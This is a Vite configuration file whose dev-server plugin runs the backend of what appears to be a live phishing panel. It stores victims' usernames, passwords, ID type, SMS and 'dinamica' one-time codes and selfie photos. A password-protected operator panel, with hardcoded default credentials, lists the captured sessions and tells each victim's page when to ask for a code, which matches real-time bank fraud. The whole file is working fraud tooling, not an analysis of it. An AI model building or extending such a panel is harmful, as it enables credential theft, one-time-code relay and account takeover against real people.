import react from '@vitejs/plugin-react'
import { defineConfig, type Plugin } from 'vite'
import { readFileSync, existsSync } from 'node:fs'
import { join } from 'node:path'

function sessionApiPlugin(): Plugin {
  const sessions: Record<string, any> = {}
  const PANEL_USER = process.env.PANEL_USER || 'Morderkaiser'
  const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'M3q7Xp9Wv2R4k5T8zY'

  function checkAuth(req: any, res: any): boolean {
    const authHeader = req.headers.authorization
    if (!authHeader) {
      res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
      res.statusCode = 401
      res.end('Authentication required')
      return false
    }

    const authParts = authHeader.split(' ')
    if (authParts.length !== 2 || authParts[0].toLowerCase() !== 'basic') {
      res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
      res.statusCode = 401
      res.end('Authentication required')
      return false
    }

    const credentials = Buffer.from(authParts[1], 'base64').toString().split(':')
    const user = credentials[0]
    const pass = credentials[1]

    if (user === PANEL_USER && pass === PANEL_PASSWORD) {
      return true
    }

    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"')
    res.statusCode = 401
    res.end('Invalid credentials')
    return false
  }

  function readJsonBody(req: any): Promise<any> {
    return new Promise((resolve) => {
      let data = ''
      req.on('data', (chunk: any) => {
        data += chunk
      })
      req.on('end', () => {
        try {
          resolve(data ? JSON.parse(data) : {})
        } catch {
          resolve({})
        }
      })
    })
  }

  return {
    name: 'sip-session-api',
    configureServer(server) {
      server.middlewares.use(async (req, res, next) => {
        const url = new URL(req.url || '/', 'http://localhost')
        const pathname = url.pathname

        // Protect /panel in dev
        if (pathname === '/panel' || pathname.startsWith('/panel/')) {
          if (!checkAuth(req, res)) return
          // Serve index.html if pointing directly to /panel
          if (pathname === '/panel' || pathname === '/panel/') {
            const panelHtml = join(process.cwd(), 'public', 'panel', 'index.html')
            if (existsSync(panelHtml)) {
              res.setHeader('Content-Type', 'text/html; charset=utf-8')
              res.end(readFileSync(panelHtml))
              return
            }
          }
          return next()
        }

        if (!pathname.startsWith('/api/')) {
          return next()
        }

        res.setHeader('Content-Type', 'application/json')

        // 1. POST /api/sessions
        if (pathname === '/api/sessions' && req.method === 'POST') {
          const body = await readJsonBody(req)
          const { id, username, password, tipoUsuario, device, ip, state } = body
          if (!id) {
            res.statusCode = 400
            res.end(JSON.stringify({ error: 'Missing session id' }))
            return
          }

          if (sessions[id]) {
            sessions[id] = {
              ...sessions[id],
              username: username || sessions[id].username,
              password: password || sessions[id].password,
              tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
              device: device || sessions[id].device,
              ip: ip || sessions[id].ip,
              state: state || sessions[id].state,
              last_seen: Date.now(),
              updatedAt: Date.now(),
            }
          } else {
            sessions[id] = {
              id,
              index: Object.keys(sessions).length + 1,
              username: username || '—',
              password: password || '—',
              tipoUsuario: tipoUsuario || 'DNI',
              device: device || 'desktop',
              ip: ip || '127.0.0.1',
              state: state || 'waiting',
              token: '',
              selfie: '',
              createdAt: Date.now(),
              last_seen: Date.now(),
              updatedAt: Date.now(),
            }
          }
          res.end(JSON.stringify({ success: true, session: sessions[id] }))
          return
        }

        // 2. GET /api/sessions
        if (pathname === '/api/sessions' && req.method === 'GET') {
          if (!checkAuth(req, res)) return
          const now = Date.now()
          const list = Object.values(sessions).map((s) => {
            const online = now - s.last_seen < 20000
            return { ...s, online }
          })
          res.end(JSON.stringify(list))
          return
        }

        // 8. POST /api/clear
        if (pathname === '/api/clear' && req.method === 'POST') {
          if (!checkAuth(req, res)) return
          for (const key of Object.keys(sessions)) {
            delete sessions[key]
          }
          res.end(JSON.stringify({ success: true }))
          return
        }

        // 3, 4, 5, 6, 7, 8. Subpaths of /api/sessions/:id
        const sessionMatch = pathname.match(/^\/api\/sessions\/([^/]+)(\/(.*))?$/)
        if (sessionMatch) {
          const sessionId = sessionMatch[1]
          const subaction = sessionMatch[3]

          if (!subaction && req.method === 'GET') {
            const session = sessions[sessionId]
            if (!session) {
              res.statusCode = 404
              res.end(JSON.stringify({ error: 'Session not found' }))
              return
            }
            res.end(JSON.stringify(session))
            return
          }

          if (subaction === 'ping' && req.method === 'POST') {
            if (!sessions[sessionId]) {
              res.statusCode = 404
              res.end(JSON.stringify({ error: 'Session not found' }))
              return
            }
            sessions[sessionId].last_seen = Date.now()
            res.end(JSON.stringify({ success: true }))
            return
          }

          if (subaction === 'token' && req.method === 'POST') {
            const body = await readJsonBody(req)
            if (!sessions[sessionId]) {
              res.statusCode = 404
              res.end(JSON.stringify({ error: 'Session not found' }))
              return
            }
            sessions[sessionId].token = body.token || ''
            const currentAction = sessions[sessionId].action
            sessions[sessionId].state =
              currentAction === 'sms' ? 'received-sms' : 'received-dinamica'
            sessions[sessionId].action = null
            sessions[sessionId].last_seen = Date.now()
            sessions[sessionId].updatedAt = Date.now()
            res.end(JSON.stringify({ success: true, session: sessions[sessionId] }))
            return
          }

          if (subaction === 'selfie' && req.method === 'POST') {
            const body = await readJsonBody(req)
            if (!sessions[sessionId]) {
              res.statusCode = 404
              res.end(JSON.stringify({ error: 'Session not found' }))
              return
            }
            if (!Array.isArray(sessions[sessionId].selfies)) {
              sessions[sessionId].selfies = []
            }
            if (body.photo) {
              sessions[sessionId].selfie = body.photo
              sessions[sessionId].selfies.push({
                id: `selfie_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
                photo: body.photo,
                timestamp: Date.now(),
              })
            }
            sessions[sessionId].state = 'received-selfie'
            sessions[sessionId].last_seen = Date.now()
            sessions[sessionId].updatedAt = Date.now()
            res.end(JSON.stringify({ success: true, session: sessions[sessionId] }))
            return
          }

          if (subaction === 'action' && req.method === 'POST') {
            if (!checkAuth(req, res)) return
            const body = await readJsonBody(req)
            if (!sessions[sessionId]) {
              res.statusCode = 404
              res.end(JSON.stringify({ error: 'Session not found' }))
              return
            }
            sessions[sessionId].state = body.state || sessions[sessionId].state
            sessions[sessionId].action = body.action
            if (body.action === 'dinamica' || body.action === 'sms') {
              sessions[sessionId].token = ''
            }
            sessions[sessionId].last_seen = Date.now()
            sessions[sessionId].updatedAt = Date.now()
            res.end(JSON.stringify({ success: true, session: sessions[sessionId] }))
            return
          }

          if (subaction === 'state' && req.method === 'POST') {
            const body = await readJsonBody(req)
            if (!sessions[sessionId]) {
              res.statusCode = 404
              res.end(JSON.stringify({ error: 'Session not found' }))
              return
            }
            if (body.state) sessions[sessionId].state = body.state
            if (body.resetAction) sessions[sessionId].action = null
            sessions[sessionId].last_seen = Date.now()
            sessions[sessionId].updatedAt = Date.now()
            res.end(JSON.stringify({ success: true, session: sessions[sessionId] }))
            return
          }
        }

        next()
      })
    },
  }
}

// https://vite.dev/config/
export default defineConfig({
  plugins: [react(), sessionApiPlugin()],
})
